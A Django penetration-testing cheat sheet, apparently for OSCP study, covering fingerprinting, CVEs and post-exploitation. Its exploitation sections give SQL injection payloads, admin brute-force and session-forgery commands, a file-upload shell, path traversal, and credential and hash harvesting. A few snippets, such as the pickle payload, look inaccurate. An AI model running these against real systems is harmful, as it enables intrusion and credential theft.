# Django

> Python web framework reference for penetration testing. Covers detection,
> enumeration, known CVEs, exploitation patterns, misconfigurations, and
> post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers / cookies

Django sets a distinctive `csrftoken` cookie and usually no `Server` header:

```bash
curl -sI http://<TARGET>/ | grep -iE '^(server|set-cookie|x-frame)'
```

Expected output:

```text
Set-Cookie: csrftoken=abc123...; expires=...; Max-Age=31449600; Path=/; SameSite=Lax
X-Frame-Options: DENY
```

The `csrftoken` cookie name is the strongest Django indicator.

### Default error pages

Django `DEBUG = True` pages are extremely verbose:

```text
Page not found (404)
Request Method: GET
Request URL: http://target/nonexistent
Using the URLconf defined in myproject.urls, Django tried these URL patterns, in this order:
  1. admin/
  2. ^api/ [name='api-root']
  ...
The current path, nonexistent, didn't match any of these.
```

Django `DEBUG = False` pages are generic: `Server Error (500)`, `Not Found (404)`
with no detail. Django admin page at `/admin/` has the distinctive purple
header and "Django administration" title.

### favicon.ico

Django `django-admin startproject` does not ship a favicon. `favicon.ico` 404
with generic Django error is a weak signal.

### Headers specific to Django

- `X-Frame-Options: DENY` (default since 1.9)
- `Vary: Cookie` (CSRF middleware)
- `Set-Cookie: csrftoken=...`
- `Set-Cookie: sessionid=...` (after login)

### Python / WSGI server headers

If behind gunicorn / uWSGI / waitress, `Server` header reveals the WSGI server,
not Django:

```text
Server: gunicorn/20.1.0
Server: uWSGI/2.0.20
Server: waitress
```

### nmap / whatweb

```bash
nmap -sV -p 80,443,8000,8080 --script http-headers,http-title <TARGET>
whatweb -a 3 http://<TARGET>/
```

---

## 2. Enumeration

### Standard Django paths

```bash
for p in /admin/ /admin/login/ /api/ /api/v1/ /static/ /media/ /accounts/ \
         /accounts/login/ /__debug__/ /sitemap.xml /robots.txt /healthz /metrics; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

### /admin/ enumeration

Django admin reveals the app models after login. Without login:

- `/admin/login/?next=/admin/` -> standard login form
- Response body reveals Django version in HTML comments sometimes
- `<input type="hidden" name="csrfmiddlewaretoken" value="...">`

### Django REST Framework (DRF) endpoints

If DRF is used, `/api/` often shows a browsable API:

```bash
curl -s http://<TARGET>/api/ | grep -iE 'django|rest_framework|browsable'
```

Browsable API in `DEBUG=True` reveals all registered routes.

### Static / media

```bash
curl -s http://<TARGET>/static/ | grep -i index
curl -s http://<TARGET>/media/ | grep -i index
curl -s http://<TARGET>/static/admin/css/base.css | head -5
```

If directory listing is enabled, browse for source leaks.

### Settings leak via error page

When `DEBUG=True`, trigger any exception. Traceback shows:

- Full `settings.py` values (SECRET_KEY, DATABASES, ALLOWED_HOSTS, INSTALLED_APPS)
- Environment variables
- Local path (`/home/user/myproject/...`)
- Django version
- Installed Python packages

```bash
curl -s http://<TARGET>/api/%00
curl -s "http://<TARGET>/?q='"
curl -s "http://<TARGET>/api/users/1'"
```

### Django admin version

HTML of `/admin/login/` contains:

```html
<link rel="stylesheet" type="text/css" href="/static/admin/css/base.css">
<script src="/static/admin/js/vendor/jquery/jquery.js"></script>
```

The exact file paths sometimes leak the Django version.

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,xml,txt,html,bak,py
```

### Source maps (.js.map)

```bash
for f in $(curl -s http://<TARGET>/ | grep -oE '/static/[^"]+\.js'); do
  curl -s "http://<TARGET>$f.map" -o /tmp/$(basename $f).map
done
```

---

## 3. Known CVEs

### CVE-2022-28346 / CVE-2022-28347 - SQL injection (QuerySet.annotate)

`QuerySet.annotate()`, `aggregate()`, `extra()` with untrusted dict keys leads
to SQL injection on PostgreSQL and MySQL.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-28346
NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-28347
Affected: Django 2.2 < 2.2.28, 3.2 < 3.2.13, 4.0 < 4.0.4.

### CVE-2021-35042 - SQL injection (QuerySet.order_by)

`order_by()` accepts untrusted column names -> SQL injection. Exploitable if
user input flows into `order_by()`.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-35042
Affected: Django 3.1 < 3.1.13, 3.2 < 3.2.5.

PoC:
```text
/api/users/?ordering=(CASE WHEN (1=1) THEN id ELSE (SELECT 1/0) END)
```

### CVE-2020-9402 - SQL injection (Oracle GIS)

`django.contrib.gis.db.models.functions` on Oracle backend -> SQLi.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-9402
Affected: Django 1.11 < 1.11.29, 2.2 < 2.2.11, 3.0 < 3.0.4.

### CVE-2024-27351 - ReDoS in `truncatechars_html`

Regular expression DoS in `django.utils.text.Truncator.words()`.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-27351
Affected: Django 3.2 < 3.2.25, 4.2 < 4.2.11, 5.0 < 5.0.3.

### CVE-2023-46695 - DoS in `UsernameField`

DoS via `NFKC` normalization on Windows. Low severity.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-46695
Affected: Django 3.2 < 3.2.23, 4.2 < 4.2.7, 5.0 < 5.0.1.

### CVE-2019-19844 - Password reset account takeover

Unicode normalization in password reset emails -> attacker registers
`admin@example.com` (with different bytes) and receives reset link for
`admin@example.com`.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-19844
Affected: Django 1.11 < 1.11.27, 2.2 < 2.2.9, 3.0 < 3.0.1.

### CVE-2018-14574 - Open redirect (CommonMiddleware)

`CommonMiddleware` with `APPEND_SLASH=True` and crafted path -> open redirect.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-14574
Affected: Django 1.11 < 1.11.15, 2.0 < 2.0.8.

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 2.2 < 2.2.28, 3.2 < 3.2.13 | SQLi annotate | CVE-2022-28346 |
| 3.1 < 3.1.13, 3.2 < 3.2.5 | SQLi order_by | CVE-2021-35042 |
| 1.11 < 1.11.27, 2.2 < 2.2.9 | Password reset | CVE-2019-19844 |
| 1.11 < 1.11.15, 2.0 < 2.0.8 | Open redirect | CVE-2018-14574 |

---

## 4. Exploitation Patterns

### DEBUG=True settings leak -> SECRET_KEY

If `DEBUG=True`:

```bash
curl -s http://<TARGET>/nonexistent/%00 | grep -iE 'SECRET_KEY|DATABASES|settings.py'
```

With `SECRET_KEY` and `DEBUG=True`, forge session cookies / signed data.

### SECRET_KEY abuse -> session forgery

Django's `SECRET_KEY` signs:

- `sessionid` cookies (with `django.contrib.sessions`)
- Password reset tokens
- `signed_cookies` backend session data
- CSRF tokens

Forge a session with `django-signed-cookie-generator` or manually:

```python
import django.core.signing as signing
signing.SECRET_KEY = 'leaked-secret-key'
# Flask-like signed value
signing.dumps({'user_id': 1, '_auth_user_id': '1', '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend'})
```

### Admin takeover via default creds

Django admin does not ship default credentials. But `createsuperuser` is common
with weak passwords:

- admin / admin
- admin / password
- admin / changeme
- admin / admin123

Try the same as web login (hydra, Burp Intruder).

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET> \
  http-post-form "/admin/login/:username=^USER^&password=^PASS^&csrfmiddlewaretoken=TOKEN:F=Please enter the correct"
```

### SQL injection via order_by (CVE-2021-35042)

If you control the `ordering` query parameter:

```bash
# Boolean-based
curl "http://<TARGET>/api/users/?ordering=(CASE%20WHEN%20(1=1)%20THEN%20id%20ELSE%20(SELECT%201/0)%20END)"

# Time-based (PostgreSQL)
curl "http://<TARGET>/api/users/?ordering=(CASE%20WHEN%20(1=1)%20THEN%20id%20ELSE%20(pg_sleep(5))%20END)"
```

Use `sqlmap` with tamper script for `order_by` injection:

```bash
sqlmap -u "http://<TARGET>/api/users/?ordering=id" --tamper=space2comment --level=5 --risk=3
```

### SSTI in templates

If user input reaches `Template()` (rare in modern Django):

```bash
curl "http://<TARGET>/page?name={%7B%207*7%20%7D%7D}"
# 49 -> SSTI
```

Django templates are sandboxed (no direct method calls), but
`{% load %}` + custom tags + `include` can lead to disclosure. See SSTI.md.

### Django admin -> RCE via pickled session

If `SESSION_ENGINE` uses a signed pickle (rare, custom), or if the app has
`django-picklefield` (unauthenticated deserialization is NOT a Django default):

```bash
# Custom backends only
python -c "import pickle, os; print(pickle.dumps(os.system))" > payload.bin
```

### File upload -> RCE

Django file uploads go to MEDIA_ROOT. If served by an unauthenticated static
handler (e.g. nginx misconfigured to serve `.py`):

```bash
curl -F "file=@shell.py" http://<TARGET>/upload/
curl http://<TARGET>/media/shell.py
```

Not exploitable by default; requires nginx/apache serving MEDIA_ROOT with
script execution.

### CSRF bypass via `csrf_exempt` on sensitive views

Look for API endpoints that modify state without CSRF protection:

```bash
# Missing csrfmiddlewaretoken + X-CSRFToken
curl -X POST http://<TARGET>/api/users/delete/1/ -H "Cookie: sessionid=..."
```

---

## 5. Misconfigurations

### DEBUG=True in production

```bash
curl -s http://<TARGET>/nonexistent/ | grep -iE 'Page not found|Traceback|DEBUG'
```

Triggers: full traceback, `SECRET_KEY`, `DATABASES`, `ALLOWED_HOSTS`, installed
apps, environment variables, absolute paths.

### ALLOWED_HOSTS=['*']

```bash
curl -H "Host: evil.com" http://<TARGET>/
```

Allows Host header attacks (cache poisoning, password reset poisoning).

### Missing CSRF protection

```bash
# Send a state-changing request without CSRF token
curl -X POST -d "email=attacker@evil.com" http://<TARGET>/account/change-email/
```

If 200/302 -> CSRF disabled on that view.

### Admin exposed with weak password

See section 4 (Admin takeover).

### Media / static served by Django in prod

```bash
curl -s http://<TARGET>/media/../../etc/passwd
```

If Django serves media (not nginx), traversal may be possible (mitigated since
Django 2.x, but check).

### Session cookie flags

```bash
curl -sI http://<TARGET>/ | grep -iE 'set-cookie.*session'
```

Missing `Secure` / `HttpOnly` / `SameSite` -> session hijacking risk.

### Exposed `.env` / `settings.py`

```bash
for f in .env .env.bak settings.py settings.py.bak local_settings.py \
         config.py secrets.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Django admin without HTTPS

```bash
curl -s http://<TARGET>/admin/login/ | grep -i form
```

Login form over HTTP -> credential sniffing.

### Exposed admin log / audit

```bash
curl -s http://<TARGET>/admin/log/ | head
```

---

## 6. Post-Exploitation

### Config file locations

| Layout | Path |
|--------|------|
| Standard | `<project>/settings.py`, `<project>/<app>/settings.py` |
| Env-based | `.env` in project root, `config/settings/{base,dev,prod}.py` |
| Docker | `/app/settings.py`, `/code/.env` |
| Deployed | `/var/www/<project>/<project>/settings.py` |
| Gunicorn env | `systemctl show gunicorn --property=Environment` |

### What to look for

```bash
find / -name 'settings.py' -not -path '*/site-packages/*' 2>/dev/null
grep -rE 'SECRET_KEY|DATABASES|AWS_|STRIPE_|SMTP|PASSWORD' /app/ /var/www/ 2>/dev/null
```

Key items:

- `SECRET_KEY` -> forge sessions, signed cookies
- `DATABASES` -> DB creds (user, password, host)
- `AWS_*` / `S3_*` -> cloud credentials
- `EMAIL_HOST_PASSWORD` -> SMTP creds
- `STRIPE_*`, `SENDGRID_*`, `TWILIO_*` -> third-party API keys
- `REDIS_URL` / `CELERY_BROKER_URL` -> Redis with no auth sometimes
- `CACHES['default']['LOCATION']` -> memcached / Redis

### DB credential chain

If `DATABASES` gives DB creds:

```bash
psql -h <dbhost> -U <dbuser> -d <dbname> -W
# Or:
mysql -h <dbhost> -u <dbuser> -p<password> <dbname>
```

Django's `auth_user` table -> password hashes (PBKDF2 by default):

```sql
SELECT username, password FROM auth_user;
```

Hash format: `pbkdf2_sha256$<iterations>$<salt>$<hash>`

Crack with hashcat mode 10000:

```bash
hashcat -m 10000 django_hashes.txt rockyou.txt
```

Or `django-hashcat`, or `john --format=django`.

### Session table

```sql
SELECT session_key, session_data, expire_date FROM django_session;
```

`session_data` is base64-encoded JSON. Decode:

```bash
echo '<session_data>' | base64 -d | jq .
```

May reveal user IDs, CSRF tokens, cart contents.

### Logs

```bash
ls -la /var/log/django/ /var/log/gunicorn/ 2>/dev/null
tail -n 200 /var/log/gunicorn/access.log
```

### Celery task inspection

If Celery worker with Redis / RabbitMQ no-auth:

```bash
redis-cli -h <redis> -p 6379
> keys celery*
> lrange celery 0 -1
```

May reveal task args (including credentials passed as task args).

### Management commands (RCE if shell)

With shell access, Django has `manage.py`:

```bash
python manage.py shell
python manage.py dbshell
python manage.py createsuperuser
python manage.py runserver
```

`manage.py shell` executes arbitrary Python in the Django context with DB access.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the `csrftoken` cookie or `Server` header that identifies Django. If `DEBUG=True`, screenshot the traceback showing settings leak.

> [!IMPORTANT]
> OSCP report: if you forge a session with leaked `SECRET_KEY`, screenshot the leaked key AND the successful forged request (200 with admin content).

> [!IMPORTANT]
> OSCP report: for SQL injection via `order_by` or `annotate`, screenshot the raw request, the timing difference (or boolean diff), and the extracted data.

---

## 8. References

- Django official docs - https://docs.djangoproject.com/
- Django security releases - https://www.djangoproject.com/weblog/
- NVD search - https://nvd.nist.gov/vuln/search/results?query=django
- CVE-2021-35042 writeup - https://github.com/YouGina/CVE-2021-35042
- Django session forging - https://hackernoon.com/exploiting-djangos-secret-key
- HackTricks - Django - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/django
- django-hashcat - https://github.com/witblack/django-hashcat

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
